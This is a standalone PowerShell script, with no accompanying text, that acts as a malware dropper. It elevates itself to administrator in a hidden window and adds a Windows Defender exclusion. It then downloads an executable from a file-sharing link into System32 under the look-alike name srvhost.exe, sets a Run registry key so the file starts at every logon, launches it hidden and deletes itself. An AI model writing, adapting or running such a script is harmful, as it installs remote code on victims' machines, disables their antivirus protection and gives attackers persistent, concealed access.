if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}
$p = "$env:SystemRoot\System32\srvhost.exe"
$expectedHash = "8290BFCBEF266B861D3CE65E655D57101F8B2D3911B97D628C8B42CE4BCF972F".ToUpper()
$shouldDownload = $true
if (Test-Path $p) {
    $hash = (Get-FileHash $p -Algorithm SHA256).Hash.ToUpper()
    if ($hash -eq $expectedHash) { $shouldDownload = $false }
}
if ($shouldDownload) {
    Add-MpPreference -ExclusionPath $p
    (New-Object Net.WebClient).DownloadFile('https://store-na-phx-5.gofile.io/download/web/68d2ca19-9fca-4275-a2bd-e0da3279225f/TTS.exe', $p)
    $newHash = (Get-FileHash $p -Algorithm SHA256).Hash.ToUpper()
    if ($newHash -ne $expectedHash) { Remove-Item $p -Force; exit }
}
Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "srvhost" -Value 'powershell -ep Bypass -WindowStyle Hidden -Command "& \"$p\""' -Force
Start-Process $p -WindowStyle Hidden
Remove-Item $MyInvocation.MyCommand.Path -Force
